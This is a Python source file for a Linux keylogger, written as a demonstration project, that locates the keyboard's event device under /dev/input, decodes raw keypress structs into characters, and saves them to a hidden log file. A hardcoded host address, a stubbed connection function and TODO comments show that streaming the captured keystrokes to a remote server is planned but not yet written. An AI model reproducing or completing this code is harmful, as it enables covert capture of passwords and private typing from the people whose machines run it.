import re
import struct
import os
import socket

"""
Basic keylogger program using regex, file IO and linux event handlers.
Compiled with XYZ for ease of use in demonstrations.
Written by mowemcfc (jcartermcfc@gmail.com) starting 12/06/2020
"""

THIS_ADDR = ("192.168.0.2", 80) # This port may not always be open
                                # TODO: check multiple ports? configure host for this too

"""
Find character device file associated with keypress events using regex and device information
"""

# TODO: dynamic pathfinding to account for different filesystem structures
def get_kb_cfile():
    with open("/proc/bus/input/devices", "r") as f: # this file contains current device information, including the keyboard
        lines = f.readlines()

        pattern  = re.compile("Handlers|EV=")
        handlers = list(filter(pattern.search, lines))

        pattern = re.compile("EV=120013") # 120013 is the 'minimum' bitmask for keyboard events TODO: other bitmasks? different regex?


        for idx, elt in enumerate(handlers): # search handlers list for the event bitmask, returning the value before this which is the
            if pattern.search(elt):          # name of the event file
                line = handlers[idx-1]

        print(line)

        pattern = re.compile("event\d?[0-9]|[1-9]0")
        infile_path = "/dev/input/" + pattern.search(line).group(0) # find character device file event#

        print(infile_path)
        f.close()

    return infile_path

"""
Opens special character file associated with keyboard events, reads struct and writes to output file.
Takes path to keypress' device character file as input.

Struct format {struct input_event} is as follows (for 64bit linux systems):
    struct input_event {
        long int tv_sec
        long int tv_sec
        __u16 type;
	    __u16 code;
	    __s32 value;
    }
"""

# TODO: IF CONN NOT AVAILABLE, WRITE TO LOGFILE AND SEND WHEN ESTABLISHED, OTHERWISE STREAM KEYPRESSES TO SERV
def read_cfile(cfile_path):

    # dict of code:key pairs corresponding to keyboard entry codes found in /include/linux/input-event-codes.h
    # TODO: by-country keyboard layout, need way to determine location? 
    # TODO: shift-augmented keys
    # TODO: BUGFIX backslash, more readable char?
    qwerty_map = {
        1:"[ESC]", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
        11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "q", 17: "w",
        18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "[",
        27: "]", 28: "\n", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
        35: "h", 36: "j", 37: "k", 38: "l", 39: ";", 40: "'", 41: "`", 42: "[SHIFT]",
        43: "[BACKSLASH]", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
        51: ",", 52: ".", 53: "/", 54: "[SHIFT]", 55: "FN", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
        59: "[F1]", 60: "[F2]", 61: "[F3]", 62: "[F4]", 63: "[F5]", 64: "[F6]", 65: "[F7]",
        66: "[F8]", 67: "[F9]", 68: "[F10]", 71: "7", 72: "8", 73: "9", 74: "-", 75: "4",
        76: "5", 77: "KP6", 78: "+", 79: "1", 80: "2", 81: "3", 82: "0", 83: ".",
        87: "[F11]", 88: "[F12]"
    }

    format = 'llHHI'
    struct_size = struct.calcsize(format)

    input_file = open(cfile_path, "rb")

    keypress = input_file.read(struct_size)
    typed = ""

    if not os.path.exists(".log.txt"): # create hidden log file
        logfile = open(".log.txt", "w")
        logfile.close()

    while keypress:
        (var1, var2, type, code, value) = struct.unpack(format, keypress)
        print(var1, var2, type, code, value)

        if code != 0 and type == 1 and value == 1:
            if code in qwerty_map:
                typed += qwerty_map[code]

        keypress = input_file.read(struct_size)           
        if len(typed) == 32: # write to file every 32 characters,
            with open(".log.txt", "a") as outfile:
                outfile.write(typed)
                typed = ""

"""
Establishes TCP connection with host computer, takes (HOST, PORT) tuple as input
"""

# Let's leave this to work with only local devices for now
# TODO: configure this to work with remote computers, requires particular configurations on local network first
def establish_return_conn():
    return_addr = ("")

def main():
    cfile_path = get_kb_cfile()
    read_cfile(cfile_path)

main()